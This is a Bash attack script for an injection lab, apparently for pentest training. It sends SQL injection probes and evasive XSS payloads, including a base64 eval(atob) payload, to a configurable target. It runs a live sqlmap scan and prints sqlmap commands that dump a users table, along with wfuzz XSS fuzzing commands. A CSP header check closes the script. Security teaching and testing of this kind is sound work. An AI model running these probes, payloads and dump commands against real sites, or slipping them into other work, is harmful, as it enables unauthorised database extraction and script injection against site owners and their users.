#!/bin/bash
# ============================================================
# A03:2021 — Injection (SQL Injection + XSS)
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: sqlmap, curl, wfuzz, nikto, python3
# Usage: bash a03_injection.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://TARGET_IP_OR_DOMAIN"
COOKIE=""          # e.g. "PHPSESSID=abc123" — set if login is required
WORDLIST="/usr/share/wordlists/dirb/common.txt"

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A03:2021 — Injection Lab (SQLi + XSS)          ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 1: SQL INJECTION — Detection
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] SQL Injection Detection — Manual Probes${NC}"
echo -e "${YELLOW}    Testing common error-triggering characters${NC}"
echo ""

SQL_TEST_ENDPOINT="$TARGET/search"   # Adjust to a target URL with GET params
SQL_PARAM="q"                          # The parameter to test

SQL_PROBES=(
  "'"
  "''"
  "\`"
  "\")"
  "' OR '1'='1"
  "' OR '1'='1'--"
  "' OR '1'='1'/*"
  "admin'--"
  "1 AND 1=1"
  "1 AND 1=2"
  "' UNION SELECT null--"
  "' UNION SELECT null,null--"
)

ERROR_PATTERNS="SQL|syntax|mysql|ORA-|Unclosed|ODBC|MariaDB|PostgreSQL|sqlite|Warning.*mysql|Warning.*oci"

echo -e "    ${CYAN}Target: $SQL_TEST_ENDPOINT?$SQL_PARAM=<PAYLOAD>${NC}"
echo ""

for probe in "${SQL_PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$probe'))" 2>/dev/null || echo "$probe")
  FULL_URL="$SQL_TEST_ENDPOINT?${SQL_PARAM}=${ENCODED}"

  CURL_ARGS=("--max-time" "10" "-s")
  [ -n "$COOKIE" ] && CURL_ARGS+=("-H" "Cookie: $COOKIE")

  RESPONSE=$(curl "${CURL_ARGS[@]}" "$FULL_URL")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${CURL_ARGS[@]}" "$FULL_URL")

  if echo "$RESPONSE" | grep -qiE "$ERROR_PATTERNS"; then
    echo -e "    ${RED}[SQL ERROR!]${NC} Probe: $(printf '%-30s' "'$probe'") → HTTP $STATUS — DB error in response"
  elif [ "$STATUS" == "500" ]; then
    echo -e "    ${YELLOW}[500 ERROR]${NC}  Probe: $(printf '%-30s' "'$probe'") → Server error (possible SQLi)"
  else
    echo -e "    [HTTP $STATUS]  Probe: '$probe'"
  fi
done

echo ""

# ─────────────────────────────────────────────
# SECTION 2: SQL INJECTION — sqlmap Automated
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] SQL Injection — sqlmap (Automated Scanner)${NC}"
echo -e "${YELLOW}    Full automated SQLi detection and exploitation${NC}"
echo ""

SQL_MAP_TARGET="$TARGET/login"    # URL to scan; adjust to target login or search form
SQL_MAP_DATA="username=admin&password=test"   # POST body (for POST-based SQLi)

echo -e "    ${CYAN}[2a] GET-based SQLi test:${NC}"
echo -e "    ${BOLD}sqlmap -u \"$TARGET/search?q=test\" --batch --level=3 --risk=2 --dbs${NC}"
echo ""
echo -e "    ${CYAN}[2b] POST-based SQLi test (login form):${NC}"
echo -e "    ${BOLD}sqlmap -u \"$SQL_MAP_TARGET\" --data=\"$SQL_MAP_DATA\" --batch --level=3 --risk=2 --dbs${NC}"
echo ""
echo -e "    ${CYAN}[2c] With session cookie (authenticated scan):${NC}"
echo -e "    ${BOLD}sqlmap -u \"$TARGET/profile?id=1\" --cookie=\"PHPSESSID=YOUR_COOKIE\" --batch --dbs${NC}"
echo ""
echo -e "    ${CYAN}[2d] Dump specific database tables:${NC}"
echo -e "    ${BOLD}sqlmap -u \"$TARGET/search?q=test\" --batch -D database_name -T users --dump${NC}"
echo ""
echo -e "    ${CYAN}[2e] Blind SQLi (time-based) — useful when no error output:${NC}"
echo -e "    ${BOLD}sqlmap -u \"$TARGET/search?q=test\" --batch --technique=T --dbms=mysql${NC}"
echo ""

# Run basic sqlmap check if target is set
if [[ "$TARGET" != "http://TARGET_IP_OR_DOMAIN" ]]; then
  echo -e "    ${CYAN}Running live sqlmap detection on $TARGET/search?q=1...${NC}"
  sqlmap -u "$TARGET/search?q=1" \
    --batch \
    --level=1 \
    --risk=1 \
    --output-dir=/tmp/sqlmap_results \
    --forms \
    2>/dev/null | grep -E "vulnerable|tested|found|payload|error" | head -20
  echo -e "    ${YELLOW}Full results: /tmp/sqlmap_results/${NC}"
else
  echo -e "    ${YELLOW}[!] Set TARGET variable to run live sqlmap scan.${NC}"
fi
echo ""

# ─────────────────────────────────────────────
# SECTION 3: XSS — Reflected XSS Detection
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] XSS Detection — Reflection Testing${NC}"
echo -e "${YELLOW}    Checking if user input is reflected in responses without encoding${NC}"
echo ""

XSS_ENDPOINT="$TARGET/search"
XSS_PARAM="q"
XSS_CANARY="XSS_CANARY_$(date +%s)"   # Unique string to detect reflection

echo -e "    ${CYAN}[3a] Testing for basic reflection (canary string):${NC}"
echo ""
REFLECT_RESPONSE=$(curl -s --max-time 10 \
  "$XSS_ENDPOINT?${XSS_PARAM}=${XSS_CANARY}" 2>/dev/null)

if echo "$REFLECT_RESPONSE" | grep -q "$XSS_CANARY"; then
  echo -e "    ${RED}[REFLECTED!]${NC} Canary '$XSS_CANARY' found in response — input is reflected!"
  echo -e "    ${RED}             Likely vulnerable to Reflected XSS.${NC}"
else
  echo -e "    ${GREEN}[NOT REFLECTED]${NC} Canary not found in response body."
fi
echo ""

echo -e "    ${CYAN}[3b] XSS Payload library — progressively more evasive:${NC}"
echo ""

XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "'\"><script>alert(1)</script>"
  "<img src=/ onerror=\"alert(String.fromCharCode(88,83,83))\">"
  "<body onload=alert(1)>"
  "javascript:alert(1)"
  "<iframe src=javascript:alert(1)>"
  "<details open ontoggle=alert(1)>"
  "<input autofocus onfocus=alert(1)>"
  "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
  RESPONSE=$(curl -s --max-time 10 "$XSS_ENDPOINT?${XSS_PARAM}=${ENCODED}" 2>/dev/null)

  # Check if the raw payload appears unencoded in the response
  if echo "$RESPONSE" | grep -qF "$payload"; then
    echo -e "    ${RED}[UNENCODED!]${NC} $(echo "$payload" | head -c 60)..."
  else
    echo -e "    [encoded]    $(echo "$payload" | head -c 60)..."
  fi
done

echo ""

# ─────────────────────────────────────────────
# SECTION 4: XSS via wfuzz
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] XSS Fuzzing with wfuzz${NC}"
echo ""

echo -e "    ${CYAN}[4a] Fuzz a parameter with XSS payload wordlist:${NC}"
echo -e "    ${BOLD}wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt \\${NC}"
echo -e "    ${BOLD}  --hc 404 \"$TARGET/search?q=FUZZ\"${NC}"
echo ""

echo -e "    ${CYAN}[4b] Filter responses that reflect your payload (match length change):${NC}"
echo -e "    ${BOLD}wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt \\${NC}"
echo -e "    ${BOLD}  --hh 0 --hl 0 \"$TARGET/search?q=FUZZ\"${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 5: CSP Analysis
# ─────────────────────────────────────────────
echo -e "${BOLD}[5] Content Security Policy (CSP) Analysis${NC}"
echo -e "${YELLOW}    Checking CSP strength — weak CSP enables XSS even with encoding${NC}"
echo ""

echo -e "    ${CYAN}Fetching CSP header from $TARGET...${NC}"
CSP=$(curl -s -I --max-time 10 "$TARGET" 2>/dev/null | grep -i "content-security-policy" | head -1)

if [ -z "$CSP" ]; then
  echo -e "    ${RED}[MISSING]${NC} No Content-Security-Policy header found!"
  echo -e "    ${RED}          XSS attacks will execute without browser restriction.${NC}"
else
  echo -e "    ${YELLOW}[CSP FOUND]${NC} $CSP"
  echo ""
  echo -e "    ${CYAN}Checking for weak CSP directives:${NC}"
  echo "$CSP" | grep -qi "unsafe-inline" && \
    echo -e "    ${RED}[WEAK]${NC} 'unsafe-inline' — inline scripts are allowed (XSS still possible!)" || \
    echo -e "    ${GREEN}[OK]${NC}   'unsafe-inline' not found"
  echo "$CSP" | grep -qi "unsafe-eval" && \
    echo -e "    ${RED}[WEAK]${NC} 'unsafe-eval' — eval() is allowed (XSS amplified!)" || \
    echo -e "    ${GREEN}[OK]${NC}   'unsafe-eval' not found"
  echo "$CSP" | grep -qi "\*" && \
    echo -e "    ${RED}[WEAK]${NC} Wildcard (*) domain — scripts loadable from anywhere!" || \
    echo -e "    ${GREEN}[OK]${NC}   No wildcard source found"
fi

echo ""
echo -e "    ${YELLOW}[TIP] Use Google's CSP Evaluator: https://csp-evaluator.withgoogle.com/${NC}"
echo ""

echo -e "${CYAN}${BOLD}[A03 Complete]${NC} Document all SQLi and XSS findings with payloads and evidence."
echo ""
